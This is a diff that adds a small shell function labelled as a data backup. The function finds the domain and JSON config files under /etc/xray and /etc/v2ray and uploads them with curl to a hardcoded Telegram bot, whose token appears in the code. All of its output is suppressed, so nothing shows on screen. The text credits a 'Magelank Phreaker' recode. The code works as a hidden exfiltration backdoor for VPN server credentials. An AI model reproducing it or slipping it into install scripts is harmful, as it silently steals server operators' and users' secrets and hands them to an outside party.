@@ -1,0 +1,41 @@
+function sayaGanteng(){
+
+bt=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
+ci=1117211252
+tekz="
+Yaddy Kakkoii Sugoi Tensai Desu
+_____________________________
+SUCCESS KIRIM DATA BACKUP
+_____________________________
+Recode by : Magelank Phreaker
+"
+
+DIREKTORI=/etc/xray
+FILEX=$(find $DIREKTORI -name '*domain')
+    for FILE in $FILEX; do
+        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    done
+
+
+DIREKTORIZ=/etc/xray
+
+FILEZ=$(find $DIREKTORIZ -name '*.json')
+    for FILE in $FILEZ; do
+        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    done
+
+DIREKTORY=/etc/v2ray
+
+FILEQ=$(find $DIREKTORY -name '*.json')
+    for FILE in $FILEQ; do
+        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    done
+
+cp -f /etc/xray/config.json /root/config.json.txt
+
+curl -F chat_id="$ci" -F document=@"config.json.txt" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+
+rm -f /root/config.json.txt
+
+}
+sayaGanteng > /dev/null 2>&1
